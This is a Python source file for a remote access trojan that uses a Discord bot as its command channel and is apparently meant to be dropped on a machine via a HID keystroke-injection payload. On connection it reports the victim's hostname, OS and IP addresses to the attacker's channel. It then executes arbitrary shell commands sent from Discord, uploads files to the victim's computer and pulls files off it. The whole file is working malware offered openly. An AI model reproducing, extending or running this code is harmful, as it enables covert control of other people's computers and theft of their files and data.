import os
import discord
import subprocess
import signal
from dotenv import load_dotenv
import asyncio
import platform
import socket
from requests import get
import sys

intents = discord.Intents.default()
intents.message_content = True

# Check if it is being used in a HID payload

try:
    if sys.argv[1] == "1":
        token = sys.argv[2]
        print(token)
    else:
        print("Not executed with HID payload")
        load_dotenv()

        token = os.getenv("DISCORD_TOKEN")
except:
    print("probably not executed with HID payload")
    load_dotenv()

    token = os.getenv("DISCORD_TOKEN")

client = discord.Client(intents=intents)

process = None


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    channel = client.get_channel(1016021010920775824)

    hostname = platform.node()
    OS = platform.system()
    Dir = os.getcwd()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()

    ip = get('https://api.ipify.org').content.decode('utf8')
    public_ip = format(ip)

    embed = discord.Embed(
        title="Connection Made",
        color=discord.Color.green()
    )

    embed.add_field(
        name="Host",
        value=f"Host is `{hostname}` running `{OS}`",
        inline=False
    )

    embed.add_field(
        name="Shell Directory",
        value=f"Shell made in directory: `{Dir}`",
        inline=False
    )

    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )

    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await channel.send(embed=embed)


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    global process

    if "quit" in message.content.lower():
        try:
            if process is not None:
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                await message.channel.send("Process killed")
                print("Killed")
            else:
                await message.channel.send("No processes to kill")
                print("No processes to kill")

        except Exception as e:
            await message.channel.send(str(e))

    elif message.content.startswith('!help'):

        embed = discord.Embed(
            title="Discord RAT help screen",
            description="If the bot has successfully been placed on your basicly have a reverse shell on them.",
            color=discord.Color.blue()
        )

        embed.add_field(
            name="Executing Shell Commands",
            value="Anytime you send a message with a `!` in front, you execute a command on the target's computer. Please note that this shell isn't completely robust, and you don't have admin privileges.",
            inline=False
        )

        embed.add_field(
            name="Non standard shell Commands",
            value="Here are some non-shell commands you can also use:\n"
                  "- `!upload` (used to upload a file to the target's computer, just attach your file with Discord and send)\n"
                  "- `!download` (used to extract a file from the target's computer, after typing `!download`, just write the file name and send)",
            inline=False
        )

        await message.channel.send(embed=embed)

    elif message.content.startswith('!cd '):
        new_dir = message.content[4:]

        try:
            os.chdir(new_dir)
            current_directory = os.getcwd()

            await message.channel.send(f"Changed directory to {current_directory}")

        except FileNotFoundError:
            await message.channel.send(f"Directory '{new_dir}' not found.")
        except Exception as e:
            await message.channel.send(str(e))

    elif message.content.startswith("!download"):
        send_content = message.content[10:]
        print(send_content)
        try:
            current_directory = os.getcwd()
            file_location = current_directory + "/" + send_content
            print(file_location)
            await message.channel.send(file=discord.File(file_location))
        except Exception as e:
            await message.channel.send(str(e))

    elif message.content.startswith("!upload"):
        if message.attachments:
            for attachment in message.attachments:
                current_directory = os.getcwd()
                await attachment.save(f"{current_directory}/{attachment.filename}")
                print(f"Saved attachment: {attachment.filename}")
        else:
            await message.channel.send("No attachments to upload")

    elif message.content.startswith('!'):
        command = message.content[1:]

        try:
            if platform.system() == "Windows":
                if platform.system() == "Windows":
                    def shell(command):
                        output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                        return output.stdout.decode('CP437').strip()

                    out = shell(command)
                    print(out)
                    if len(out) == 0:
                        out = "Empty"
                    await message.channel.send(out)

            else:
                print("user is not using windows")
                process = subprocess.Popen(
                    [command], shell=True, universal_newlines=True,
                    preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )

                async def send_output():
                    while process.poll() is None:
                        output = process.stdout.readline()
                        if output:
                            await message.channel.send(output)

                    remaining_output = process.stdout.read()
                    if remaining_output:
                        await message.channel.send(remaining_output)

                await asyncio.create_task(send_output())

        except Exception as e:
            await message.channel.send(str(e))


client.run(token)
